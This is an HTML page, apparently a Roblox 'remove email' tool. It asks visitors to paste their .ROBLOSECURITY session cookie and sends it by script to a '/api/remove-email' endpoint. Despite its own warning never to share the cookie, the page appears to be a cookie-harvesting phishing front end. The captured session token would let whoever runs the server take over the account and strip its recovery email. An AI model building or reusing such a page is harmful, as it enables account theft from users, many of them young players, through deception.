<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Remove Email from Roblox</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
      max-width: 500px;
      width: 100%;
      text-align: center;
    }

    h2 {
      color: #333;
      margin-bottom: 20px;
    }

    textarea {
      width: 100%;
      height: 150px;
      resize: none;
      padding: 15px;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 14px;
      margin-bottom: 20px;
    }

    button {
      padding: 12px 25px;
      background-color: #28a745;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #218838;
    }

    #result {
      margin-top: 20px;
      font-weight: bold;
      color: #555;
    }

    .warning {
      font-size: 12px;
      color: #dc3545;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Remove Email from Roblox</h2>
    <div class="warning">⚠️ Do not share your .ROBLOSECURITY cookie with anyone.</div>
    <form id="removeForm">
      <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..." required></textarea>
      <button type="submit">Remove Email</button>
    </form>
    <div id="result"></div>
  </div>

  <script>
    document.getElementById('removeForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const cookie = document.getElementById('cookieInput').value.trim();
      const resultDiv = document.getElementById('result');
      resultDiv.textContent = "⏳ Processing...";

      try {
        const res = await fetch('/api/remove-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie })
        });

        const data = await res.json();
        if (res.ok) {
          resultDiv.textContent = data.message || "✅ Email removed.";
          resultDiv.style.color = "green";
        } else {
          resultDiv.textContent = data.error || "❌ Failed to remove email.";
          resultDiv.style.color = "red";
        }
      } catch (err) {
        resultDiv.textContent = "❌ Error occurred: " + err.message;
        resultDiv.style.color = "red";
      }
    });
  </script>
</body>
</html>
